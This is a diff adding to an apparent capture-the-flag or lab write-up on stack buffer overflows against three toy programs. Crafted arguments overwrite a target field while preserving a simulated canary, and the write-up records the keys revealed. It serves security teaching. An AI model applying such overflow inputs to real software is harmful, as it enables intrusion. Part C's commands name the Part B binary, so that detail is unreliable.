@@ -1,6 +1,6 @@
-
+#########################
 ## Problem One, Part A ##
-### Walk Through ###
+#########################
 We start by trying to execute the program and we are greeted with output.
  
  user@host$ ./oflow_partA
@@ -36,4 +36,150 @@ Progress. It looks like our input was also copied into where ever Target is gett
   The key is: "smash the stack"
 
 Success. We got a secret key from the program. 
+
+
+#########################
+## Problem One, Part B ##
+#########################
+
+Using the same tactic as the previous problem we will disover that this program also takes a single argument. When we provide some input at the command line we get slightly different output.
+
+  user@host$ ./oflow_partB AAAA
+
+  Buffer: AAAA
+  Target: fail
+  Canary: hacker
+
+  Target not set to "pass"
+
+The output has an extra field that has the value "hacker". It seems like the goal is the same though-- we need to set the target field to pass. We could try the same input that got us the key in the last problem. Rather, lets try to overflow the with a lot of input just as we did while exploring the previous program. 
+
+  user@host$ ./oflow_partB AAAAAAAAAAAAAAAAAAAA
+
+  Buffer: AAAAAAAAAAAA
+  Target: AAAA
+  Canary: AAAAer
+
+  Target Not set to "pass"
+  You overwrote the stack canary.
+
+Great! It looks like we overflowed the buffer field and overwrote the Target field and part of the Canary field. Looking at the output statements it seems like our goal might still be the same, to set Target to "pass", with an extra restriction of not touching the canary. Counting the 'A's in the buffer field we see that it is probably a buffer of 12 bytes. The input from the last problem should work. 
+
+  user@host$ ./oflow_partB AAAAAAAAAAAApass
+
+  Buffer: AAAAAAAAAAAA
+  Target: pass
+  Canary: hacker
+
+  Congrats! You overwrote the target without touching the canary!
+  The key is: "halt and catch fire"
+
+Success! We got the key. By overflowing the buffer and overwriting the target. But we also overwrote the canary in the previous attempt with the input "AAAAAAAAAAAAAAAAAAAA". What happens if we append "hacker" to the input that got us the key?
+
+  user@host$ ./oflow_partB AAAAAAAAAAAApasshacker
+
+  Buffer: AAAAAAAAAAAA
+  Target: pass
+  Canary: hacker
+
+  Congrats! You overwrote the target without touching the canary!
+  The key is: "halt and catch fire"
+
+Success again! We overwrote the canary but with the value "hacker" that the underlying check expects. 
+
+
+########################
+# Problem One, Part C ##
+########################
+
+Using the same initial steps we can tell the program takes a single argument and gives the following output: 
+
+  user@host$ ./oflow_partC AAAA
+
+  Buffer: AAAA
+  Canary: hacker
+  Target: fail
+
+  Target not set to "pass".
+
+The Canary and Target fields have swapped positions! Lets try to overflow the buffer and see what we get.
+
+  user@host$ ./oflow_partB AAAAAAAAAAAAAAAAAAAA
+
+  Buffer: AAAAAAAAAAAA
+  Canary: AAAAAA
+  Target: AAil
+
+  Target Not set to "pass"
+  You overwrote the stack canary.
+
+Our input completely overwrite the canary and only partially overwrote the target. If we swap the last two 'A's in our input for "pa" and add an "ss" to it we might be able to set the target to "pass" like the prompt is asking for. 
+
+  user@host$ ./oflow_partB AAAAAAAAAAAAAAAAAApass
+
+  Buffer: AAAAAAAAAAAA
+  Canary: AAAAAA
+  Target: pass 
+
+  You overwrote the stack canary.
+
+Progress. We overwrote the target with "pass". However, we smashed the Canary value with 'A's. As the final output line suggests lets try to fix that. We modify our input to inlude the original Canary value of "hacker" which is 6 characters long. Further, it needs to go infront of "pass". So, replacing 6 'A's, from infront of "pass", with "hacker" we get the following.
+
+  user@host$ ./oflow_partB AAAAAAAAAAAAhackerpass
+
+  Buffer: AAAAAAAAAAAA
+  Canary: hacker
+  Target: pass 
+
+  Congrats! You overwrote the target while preserving the canary!
+  The key is: "hack the planet"
+
+Success! We got the final key. 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
